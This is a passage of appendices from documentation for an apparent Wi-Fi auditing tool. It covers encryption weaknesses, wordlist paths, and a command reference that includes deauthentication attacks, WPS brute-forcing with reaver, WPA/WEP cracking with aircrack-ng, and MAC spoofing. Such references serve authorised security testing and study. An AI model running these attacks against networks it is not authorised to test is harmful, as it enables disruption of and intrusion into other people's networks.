| 165 | 5825 | UNII-3 |

### Appendix B: Encryption Comparison

| Type | Key Length | Security | Cracking Method |
|------|------------|----------|-----------------|
| OPN | None | None | None needed |
| WEP | 40/104 bit | Very Weak | IV attack (minutes) |
| WPA | Variable | Weak | Dictionary (hours-days) |
| WPA2-PSK | Variable | Strong | Dictionary (hours-days) |
| WPA2-Enterprise | Variable | Very Strong | Difficult |
| WPA3 | Variable | Very Strong | Currently resistant |

### Appendix C: Common Wordlists

| Wordlist | Size | Location |
|----------|------|----------|
| rockyou.txt | 14 million | `/usr/share/wordlists/rockyou.txt` |
| fasttrack.txt | 222 | `/usr/share/wordlists/fasttrack.txt` |
| common.txt | 4,614 | `/usr/share/wordlists/common.txt` |
| darkweb2017.txt | 10 million | Download required |

### Appendix D: Useful Commands Reference

```bash
# Interface management
iwconfig                          # List wireless interfaces
iw dev                            # Detailed interface info
sudo airmon-ng start wlan0        # Enable monitor mode
sudo airmon-ng stop wlan0mon      # Disable monitor mode

# Scanning
sudo airodump-ng wlan0mon                    # Scan all
sudo airodump-ng -c 6 wlan0mon               # Scan channel 6
sudo airodump-ng --bssid XX:XX wlan0mon      # Scan specific AP

# Attacks
sudo aireplay-ng -0 5 -a BSSID wlan0mon      # Deauth
sudo reaver -i wlan0mon -b BSSID -vv         # WPS attack

# Cracking
aircrack-ng -w wordlist.txt capture.cap      # WPA crack
aircrack-ng capture.cap                      # WEP crack

# Utilities
sudo macchanger -r wlan0                     # Random MAC
wash -i wlan0mon                             # Find WPS APs
```

### Appendix E: Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | Fatal error |
| 2 | Invalid arguments |
| 130 | Interrupted (Ctrl+C) |

---

## Version History

| Version | Date | Changes |
|---------|------|---------|
| 1.0.0 | 2026-01 | Initial release |

---

## Getting Help

- **Documentation**: See README.md, USAGE.md, ARCHITECTURE.md
- **Issues**: https://github.com/yourusername/wlfwifi/issues
- **Verbose Mode**: Run with `-v` for detailed output

---

**© 2026 wlfwifi Contributors | Licensed under GPL-2.0**
